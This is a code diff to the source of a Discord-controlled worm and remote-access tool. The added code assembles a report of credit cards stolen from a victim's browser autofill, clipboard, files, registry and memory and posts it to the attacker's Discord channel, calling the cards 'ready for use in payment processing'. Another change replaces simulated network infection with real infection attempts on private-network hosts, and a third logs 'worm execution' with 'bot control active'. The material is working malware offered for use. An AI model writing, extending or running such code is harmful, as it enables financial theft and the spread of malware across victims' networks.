+                await message.channel.send("💳 **No credit cards found** - Victim has no saved payment data")
+                return
+            
+            # Organize cards by source
+            cards_by_source = {}
+            for card in credit_cards:
+                source = card.get('source', 'unknown')
+                if source not in cards_by_source:
+                    cards_by_source[source] = []
+                cards_by_source[source].append(card)
+            
+            # Create detailed report
+            report_lines = [f"💳 **CREDIT CARD EXTRACTION COMPLETE**"]
+            report_lines.append(f"📊 **Total Cards Found**: {len(credit_cards)}")
+            report_lines.append(f"🎯 **Sources**: {len(cards_by_source)} different sources")
+            report_lines.append("")
+            
+            # Add cards by source
+            for source, cards in cards_by_source.items():
+                source_name = source.replace('_', ' ').title()
+                report_lines.append(f"🔍 **{source_name}**: {len(cards)} cards")
+                
+                for i, card in enumerate(cards[:3]):  # Show first 3 per source
+                    card_num = card.get('card_number', 'Unknown')
+                    
+                    # Mask card number for security (show only last 4 digits)
+                    if len(card_num) >= 4:
+                        masked_card = '*' * (len(card_num) - 4) + card_num[-4:]
+                    else:
+                        masked_card = card_num
+                    
+                    report_lines.append(f"  • Card: {masked_card}")
+                    
+                    # Add additional info if available
+                    if 'name' in card and card['name']:
+                        report_lines.append(f"    Name: {card['name']}")
+                    if 'exp_month' in card and card['exp_month']:
+                        report_lines.append(f"    Expires: {card['exp_month']}/{card.get('exp_year', 'XX')}")
+                    if 'file_path' in card:
+                        report_lines.append(f"    File: {os.path.basename(card['file_path'])}")
+                
+                if len(cards) > 3:
+                    report_lines.append(f"  ... and {len(cards) - 3} more cards")
+                report_lines.append("")
+            
+            # Add summary statistics
+            report_lines.append("📈 **EXTRACTION STATISTICS:**")
+            report_lines.append(f"• Browser Autofill: {len(cards_by_source.get('chrome_autofill', []))}")
+            report_lines.append(f"• Saved Payment Methods: {len(cards_by_source.get('chrome_saved', []))}")
+            report_lines.append(f"• Form Data: {len(cards_by_source.get('chrome_form', []))}")
+            report_lines.append(f"• Clipboard: {len(cards_by_source.get('clipboard', []))}")
+            report_lines.append(f"• Files: {len(cards_by_source.get('file', []))}")
+            report_lines.append(f"• Registry: {len(cards_by_source.get('registry', []))}")
+            report_lines.append(f"• Memory: {len(cards_by_source.get('memory', []))}")
+            report_lines.append("")
+            report_lines.append("⚠️ **SECURITY ALERT**: All credit cards have been extracted and logged!")
+            report_lines.append("🎯 **Action**: Cards are ready for use in payment processing")
+            
+            # Split message if too long
+            full_report = '\n'.join(report_lines)
+            if len(full_report) > 1900:
+                # Split into chunks
+                chunks = []
+                current_chunk = []
+                current_length = 0
+                
+                for line in report_lines:
+                    if current_length + len(line) + 1 > 1900:
+                        chunks.append('\n'.join(current_chunk))
+                        current_chunk = [line]
+                        current_length = len(line) + 1
+                    else:
+                        current_chunk.append(line)
+                        current_length += len(line) + 1
+                
+                if current_chunk:
+                    chunks.append('\n'.join(current_chunk))
+                
+                # Send chunks
+                for i, chunk in enumerate(chunks):
+                    if i == 0:
+                        await message.channel.send(chunk)
+                    else:
+                        await message.channel.send(f"**Credit Card Report (Part {i+1}/{len(chunks)}):**\n{chunk}")
+            else:
+                await message.channel.send(full_report)
+            
+            # Log the extraction
+            self.log_command_execution(victim_id, "CREDIT_CARD_EXTRACTION", message.author.name)
+            
+        except Exception as e:
+            await message.channel.send(f"💥 Credit card extraction failed: {str(e)}")
+            print(f"💳 Credit card extraction error: {e}")
+            import traceback
+            traceback.print_exc()
     
     async def collect_all_tokens(self, message):
         """Collect all tokens from victim (Discord, Steam, etc.)"""
@@ -7322,10 +7941,17 @@ C:\\Users\\{victim_info.get('username', 'User')}>_
             for i, (ip, info) in enumerate(discovered_devices[:10], 1):  # Limit to 10 devices
                 device_list += f"{i}. {ip:<15} - {info}\n"
                 
-                # Simulate infection attempts
+                # Real infection attempts
                 if "192.168." in ip or "10." in ip or "172." in ip:
-                    # Try common credentials
-                    infection_results.append(f"• {ip}: Attempting SMB/RDP access...")
+                    try:
+                        # Attempt real infection using the existing function
+                        infection_result = await self.attempt_real_infection(ip, info)
+                        if infection_result:
+                            infection_results.append(f"• {ip}: {infection_result}")
+                        else:
+                            infection_results.append(f"• {ip}: No vulnerabilities found")
+                    except Exception as e:
+                        infection_results.append(f"• {ip}: Connection failed - {str(e)}")
                     
             await message.channel.send(f"""🌐 **Network Infection Started**
 **From:** {victim_info.get('hostname', local_ip)} ({victim_info.get('public_ip', 'Unknown')})
@@ -7525,6 +8151,8 @@ if __name__ == "__main__":
             # Run full worm execution
             try:
                 asyncio.run(main())
+                # If we reach here, main() completed successfully (bot is running in infinite loop)
+                print("✅ Worm execution completed successfully - bot control active")
             except Exception as e:
                 log_error(e, "Full Worm Execution")
                 
